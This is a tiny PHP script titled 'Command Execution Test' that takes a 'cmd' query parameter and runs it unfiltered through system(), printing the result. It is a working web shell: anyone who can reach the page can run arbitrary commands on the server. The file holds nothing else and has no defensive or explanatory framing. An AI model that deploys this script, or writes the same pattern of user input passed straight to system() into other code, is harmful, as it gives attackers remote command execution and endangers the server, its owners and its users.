<?php
// Command Execution Test
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Use ?cmd=command to execute.";
}
?>
